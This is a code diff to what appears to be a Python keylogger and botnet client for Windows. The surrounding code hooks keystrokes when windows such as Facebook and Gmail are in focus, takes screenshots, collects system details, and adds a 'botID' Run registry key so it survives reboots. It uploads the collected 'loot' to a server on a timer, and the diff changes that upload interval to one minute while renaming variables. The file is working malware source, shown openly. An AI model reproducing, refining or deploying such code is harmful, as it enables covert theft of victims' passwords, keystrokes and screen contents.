@@ -1,5 +1,5 @@
 import socket
-import tempfile
+from tempfile import mkdtemp
 from threading import Timer, Thread, Lock
 from PIL import ImageGrab
 import platform
@@ -27,7 +27,7 @@ listOfWindows = ['Facebook', 'Gmail', 'Twitter', 'Hotmail', 'Ymail', 'Yandex']
 obj = pyHook.HookManager()
 lastWindowText = ''
 windowText = ''
-tempdirpath = tempfile.mkdtemp()
+tempDir = mkdtemp()
 lock = Lock()
 
 
@@ -157,7 +157,7 @@ def getSysDetails():
 def screenshot():
     now = str(datetime.now()).replace(" ", "_")
     now = now.replace(":", "_")
-    ImageGrab.grab().save(tempdirpath + "\\" + now + "-img.jpg", "JPEG")
+    ImageGrab.grab().save(tempDir + "\\" + now + "-img.jpg", "JPEG")
 
 
 def search(command):
@@ -178,8 +178,7 @@ def search(command):
 def identity():
     global identification
     identification = getSysDetails()  # send sysDetails on initialisation and set hostname for identifying bot
-    tempdirpath = tempfile.mkdtemp()
-    files = open(tempdirpath + '\identity.txt', 'wb')
+    files = open(tempDir + '\identity.txt', 'wb')
     files.write(json.dumps(identification))
     files.close()
     key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",
@@ -187,7 +186,7 @@ def identity():
     # Botname is the key name that will stop identity to be sent on each startup
     wreg.SetValueEx(key, 'botID', 0, wreg.REG_SZ, botname)
     key.Close()
-    return tempdirpath
+    return tempDir
 
 
 def initialize():
@@ -202,11 +201,11 @@ def initialize():
             0]  # ensures botname to be present at every startup , for uploading files
     except WindowsError:
         print key
-        tempdirpath = identity()
-        files = {'fileToUpload': open(tempdirpath + '\identity.txt', 'rb')}
+        tempDir = identity()
+        files = {'fileToUpload': open(tempDir + '\identity.txt', 'rb')}
         r = sendFile(files)
         files['fileToUpload'].close()
-        shutil.rmtree(tempdirpath)
+        shutil.rmtree(tempDir)
     key.Close()
 
 
@@ -219,7 +218,7 @@ def md5Hash(fname):  # Use this  to check successful transfer of data
 
 
 def emptyLoot():
-    for dirpath, dirname, files in os.walk(tempdirpath):
+    for dirpath, dirname, files in os.walk(tempDir):
         count = len(files)  # To keep track whether all files have been transferred
         while count:
             for fileName in files:
@@ -234,6 +233,7 @@ def emptyLoot():
                     except:
                         pass
                 lock.release()
+    Timer(60.0, emptyLoot).start()      # Starts to send data every 1 minute
 
 
 def terminate(s, keyloggerThread, lootThread):
@@ -295,9 +295,9 @@ def main():
     keyloggerThread = Thread(1, keylogger(), 'keylogThread', 1)
     keyloggerThread.start()
     initialize()
-    lootThread = Timer(30, emptyLoot())     # Timer thread to send loot after every 30 seconds
+    lootThread = Timer(60.0, emptyLoot())     # Timer thread to send loot after every 1 minute
     lootThread.start()
-    connect(keyloggerThread,lootThread)  # terminate() called when connection is closed
+    connect(keyloggerThread, lootThread)  # terminate() called when connection is closed
 
 
 main()
